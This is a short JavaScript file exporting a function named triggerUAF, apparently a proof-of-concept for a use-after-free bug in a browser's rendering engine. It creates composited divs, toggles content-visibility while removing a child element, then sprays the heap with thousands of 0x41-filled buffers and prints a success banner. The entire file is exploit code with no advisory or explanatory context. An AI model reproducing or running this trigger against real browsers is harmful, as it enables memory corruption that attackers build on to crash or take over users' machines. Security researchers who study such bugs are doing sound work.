export function triggerUAF() {
  const container = document.createElement("div");
  container.className = "container";
  container.style.cssText = "overflow:hidden;content-visibility:auto;transform:translateZ(0);position:relative;width:200px;height:200px;";
  const child = document.createElement("div");
  child.className = "child";
  child.style.cssText = "width:100px;height:100px;position:absolute;top:0;left:0;background:blue;transform:translateZ(0);";
  container.appendChild(child);
  document.body.appendChild(container);

  container.style.contentVisibility = "hidden";
  child.remove();

  setTimeout(() => {
    container.style.contentVisibility = "auto";
    let spray = [];
    for (let i = 0; i < 30000; i++) {
      let arr = new Uint8Array(0x1000);
      arr.fill(0x41);
      spray.push(arr);
    }
    const pre = document.createElement('pre');
    pre.textContent = "[+] UAF triggered, sprayed heap.";
    document.body.appendChild(pre);
  }, 0);
}
